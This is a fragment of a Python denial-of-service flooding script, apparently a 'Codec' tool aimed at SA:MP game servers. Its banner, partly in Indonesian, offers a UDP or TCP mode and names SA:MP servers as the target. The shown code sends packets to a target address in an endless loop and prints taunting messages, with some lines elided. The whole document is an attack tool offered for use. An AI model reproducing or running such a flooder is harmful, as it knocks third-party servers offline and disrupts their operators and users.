...
os.system("clear")
print("\033[1;32;40m ==> Codec by teddy <==  \n")
print("\033[1;32;40m ==> PENGGUNAAN KETIK 1= UDP 2 = TCP <==  \n")
print("\033[1;32;40m ==> Instagram : @tdyboyy_ <==  \n")
print("\033[1;32;40m ==> Lets fucking SA:MP Servers <==  \n")
	...
	while True:
		try:
			...
			for x in range(times):
				s.sendto(data,addr)
			print(i +" tdyyy no counter!!!")
		except:
			s.close()
			print("[!] tdyyy no counter!!!")
